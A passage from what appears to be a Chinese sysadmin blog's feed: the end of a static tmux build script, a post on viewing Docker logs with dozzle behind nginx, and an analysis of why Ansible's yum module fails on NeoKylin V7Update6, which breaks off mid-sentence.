plain">tmux() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  curl -LO https://github.com/tmux/tmux/releases/download/3.2a/tmux-3.2a.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  tar zxvf tmux-3.2a.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cd tmux-3.2a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  PKG_CONFIG_PATH=$TARGETDIR/lib/pkgconfig ./configure --enable-static --prefix=$TARGETDIR &amp;&amp; make &amp;&amp; make install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cd ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cp $TARGETDIR/bin/tmux .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libevent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ncurses</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tmux</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用dozzle通过web界面实时查看docker日志]]></title>
        <id>/2021/06/08/dozzle-realtime-docker-log-view</id>
        <link href="https://itxx00.github.io/notes/blog/2021/06/08/dozzle-realtime-docker-log-view"/>
        <updated>2021-06-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[如何通过web界面查看docker容器日志]]></summary>
        <content type="html"><![CDATA[<ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-运行dozzle">1 运行dozzle<a class="hash-link" href="#1-运行dozzle" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker run --detach --volume=/var/run/docker.sock:/var/run/docker.sock --net host  amir20/dozzle --addr 127.0.0.1:8080  --base /dockerlogs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-反向代理">2 反向代理<a class="hash-link" href="#2-反向代理" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">server {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    listen 80;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    server_name xxx;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    client_max_body_size 1G;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    add_header  Access-Control-Allow-Origin "https://xxx";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    add_header  Access-Control-Allow-Methods "GET, POST, OPTIONS";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    add_header  Access-Control-Allow-Headers "Origin, Authorization, Accept";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    add_header  Access-Control-Allow-Credentials true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    location ^~ /dockerlogs {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proxy_pass http://localhost:8080;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-访问">3 访问<a class="hash-link" href="#3-访问" title="标题的直接链接">​</a></h2><p><a href="http://x.x.x.x/dockerlogs" target="_blank" rel="noopener noreferrer">http://x.x.x.x/dockerlogs</a></p>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[中标麒麟系统ansible执行yum模块报错的问题分析]]></title>
        <id>/2021/03/22/neokylin-ansible-yum-module-not-work</id>
        <link href="https://itxx00.github.io/notes/blog/2021/03/22/neokylin-ansible-yum-module-not-work"/>
        <updated>2021-03-22T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>在使用中标麒麟V7Update6版本时，遇到了一个ansible执行报错的问题</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="问题现象">问题现象<a class="hash-link" href="#问题现象" title="标题的直接链接">​</a></h2><p>在中标麒麟（neokylin）系统中部署某服务，使用到了ansible，但是执行时发现有yum模块的task报错如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">TASK [common : Install basic rpms] **************************************************************************</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fatal: [node01]: FAILED! =&gt; {"changed": false, "msg": ["Could not detect which major revision of yum is in use, which is required to determine module backend.", "You can manually specify use_backend to tell the module whether to use the yum (yum3) or dnf (yum4) backend})"]}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>报错为yum模块无法判断出系统的yum版本，提示需要手工执行yum的use_backend参数。同样的task在原生RHEL7系统执行没有遇到任何问题，看样子调入了中标麒麟的某个坑里。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="问题分析">问题分析<a class="hash-link" href="#问题分析" title="标题的直接链接">​</a></h2><p>根据报错，很明确是因为ansible无法自动判断出系统使用的yum版本导致，我们知道当ansible中yum模块不指定use_backend参数时，将尝试自动判断，而ansible的setup模块可以获取对应的必要信息，
其中一个变量ansible_pkg_mgr及对应yum后端模块，接下来我们执行setup模块输出ansible_pkg_mgr变量来验证下我们的判断：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ansible -i hosts node01 -m setup -a "filter=ansible_pkg_mgr"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">node01 | SUCCESS =&gt; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "ansible_facts": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "discovered_interpreter_python": "/usr/bin/python"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "changed": false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>果然没有办法获取到ansible_pkg_mgr变量，先看下系统版本信息:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">~]# cat /etc/neokylin-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NeoKylin Linux Advanced Server release V7Update6 (Chromium)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接下来根据报错提示信息找到ansible相关代码，在yum.py中，相关代码如下：
ansible/plugins/action/yum.py</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        if module not in ["yum", "yum4", "dnf"]:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            facts = self._execute_module(module_name="setup", module_args=dict(filter="ansible_pkg_mgr", gather_subset="!all"), task_vars=task_vars)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            display.debug("Facts %s" % facts)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            module = facts.get("ansible_facts", {}).get("ansible_pkg_mgr", "auto")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (not self._task.delegate_to or self._task.delegate_facts) and module != 'auto':</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                result['ansible_facts'] = {'pkg_mgr': module}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if module != "auto":</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if module == "yum4":</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                module = "dnf"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if module not in self._shared_loader_obj.module_loader:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                result.update({'failed': True, 'msg': "Could not find a yum module backend for %s." % module})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            else:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                # run either the yum (yum3) or dnf (yum4) backend module</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new_module_args = self._task.args.copy()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if 'use_backend' in new_module_args:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    del new_module_args['use_backend']</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                display.vvvv("Running %s as the backend for the yum action plugin" % module)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                result.update(self._execute_module(module_name=module, module_args=new_module_args, task_vars=task_vars, wrap_async=self._task.async_val))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                # Now fall through to cleanup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        else:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            result.update(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    'failed': True,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    'msg': ("Could not detect which major revision of yum is in use, which is required to determine module backend.",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            "You can manually specify use_backend to tell the module whether to use the yum (yum3) or dnf (yum4) backend})"),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            # Now fall through to cleanup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>如代码所示，当执行yum未指定use_backend参数时，ansible会执行setup模块并根据ansible_pkg_mgr来自动判断yum的版本，获取不到则会报错，继续看下该参数的获取过程，找到pkg_mgr.py，关键代码如下：</p><p>ansible/module_utils/facts/system/pkg_mgr.py</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    def collect(self, module=None, collected_facts=None):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        facts_dict = {}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        collected_facts = collected_facts or {}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        pkg_mgr_name = 'unknown'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for pkg in PKG_MGRS:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if os.path.exists(pkg['path']):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                pkg_mgr_name = pkg['name']</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # Handle distro family defaults when more than one package manager is</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # installed or available to the distro, the ansible_fact entry should be</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # the default package manager officially supported by the distro.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if collected_facts['ansible_os_family'] == "RedHat":</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            pkg_mgr_name = self._check_rh_versions(pkg_mgr_name, collected_facts)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> def _check_rh_versions(self, pkg_mgr_name, collected_facts):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if collected_facts['ansible_distribution'] == 'Fedora':</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if os.path.exists('/run/ostree-booted'):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return "atomic_container"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            try:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if int(collected_facts['ansible_distribution_major_version']) &lt; 23:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    for yum in [pkg_mgr for pkg_mgr in PKG_MGRS if pkg_mgr['name'] == 'yum']:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        if os.path.exists(yum['path']):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            pkg_mgr_name = 'yum'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            break</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                else:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    for dnf in [pkg_mgr for pkg_mgr in PKG_MGRS if pkg_mgr['name'] == 'dnf']:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        if os.path.exists(dnf['path']):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            pkg_mgr_name = 'dnf'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            break</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            except ValueError:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                # If there's some new magical Fedora version in the future,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                # just default to dnf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                pkg_mgr_name = 'dnf'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        elif collected_facts['ansible_distribution'] == 'Amazon':</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            pkg_mgr_name = 'yum'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        else:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            # If it's not one of the above and it's Red Hat family of distros, assume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            # RHEL or a clone. For versions of RHEL &lt; 8 that Ansible supports, the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            # vendor supported official package manager is 'yum' and in RHEL 8+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            # (as far as we know at the time of this writing) it is 'dnf'.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            # If anyone wants to force a non-official package manager then they</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            # can define a provider to either the package or yum action plugins.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if int(collected_facts['ansible_distribution_major_version']) &lt; 8:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                pkg_mgr_name = 'yum'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            else:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                pkg_mgr_name = 'dnf'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return pkg_mgr_name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>以上代码可以看到当判断系统为红帽系，则会继续判断系统版本信息，当主版本号&lt;8则使用yum，否则使用dnf，这里我们初步判断为麒麟对系统做了某些修改导致无法获取到主版本号。先执行setup获取发行版代号验证下是否执行了上述逻辑：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ansible -i hosts node01 -m setup -a "filter=ansible_distribution"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">node01 | SUCCESS =&gt; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "ansible_facts": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "ansible_distribution": "RedHat",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "discovered_interpreter_python": "/usr/bin/python"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "changed": false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># ansible -i hosts node01 -m setup -a "filter=ansible_distribution_major_version"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">node01 | SUCCESS =&gt; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "ansible_facts": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "ansible_distribution_major_version": "V7Update6",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "discovered_interpreter_python": "/usr/bin/python"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "changed": false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>通过setup模块的输出结果可看到系统是判断为redhat发行版，但是通过ansible_distribution_major_version获取到的发行版主版本号为V7Update6,
而和上面判断yum版本的代码关联起来看就会发现问题所在，int(collected_facts<!-- -->['ansible_distribution_major_version']<!-- -->) &lt; 8 中，ansible_distribution_major_version 变量在其初始化的代码中对应为为distribution_version.split('.')<!-- -->[:2][0]<!-- -->的取值，而当系统中获取到的值是V7Update6时，该显然无法满足转换为int的要求。接下来看下V7Update6这个关键字的定义位置，根据经验系统版本相关信息应该在/etc/os-release中：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">~]# cat /etc/os-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME="NeoKylin Linux Advanced Server"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VERSION="V7Update6 (Chromium)"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ID="neokylin"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ID_LIKE="fedora"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VARIANT="Server"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VARIANT_ID="server"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VERSION_ID="V7Update6"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PRETTY_NAME="NeoKylin Linux Advanced Server V7Update6 (Chromium)"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ANSI_COLOR="0;31"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CPE_NAME="cpe:/o:neokylin:enterprise_linux:V7Update6:GA:server"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HOME_URL="https://www.cs2c.com.cn/"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUG_REPORT_URL="https://bugzilla.cs2c.com.cn/"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NEOKYLIN_BUGZILLA_PRODUCT="NeoKylin Linux Advanced Server 7"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NEOKYLIN_BUGZILLA_PRODUCT_VERSION=V7Update6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NEOKYLIN_SUPPORT_PRODUCT="NeoKylin Linux Advanced Server"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NEOKYLIN_SUPPORT_PRODUCT_VERSION="V7Update6"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这里果然可以看到VERSION_ID的值被定义为<code>V7Update6</code>，而系统原生发行版中该值是7，我们来看下os-release中对VERSION_ID参数的说明：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">man os-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       VERSION_ID=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           A lower-case string (mostly numeric, no spaces or other characters outside of 0-9, a-z, ".",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           "_" and "-") identifying the operating system version, excluding any OS name information or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           release code name, and suitable for processing by scripts or usage in generated filenames. This</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           field is optional. Example: "VERSION_ID=17" or "VERSION_ID=11.04".</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>根据man文档中的描述，VERSION<em>ID取值范围为全小写，通常为数值型，不应有空格或其他特殊字符，可包含的字符为0-9a-z.</em>-,那么这里可以看到两个问题，
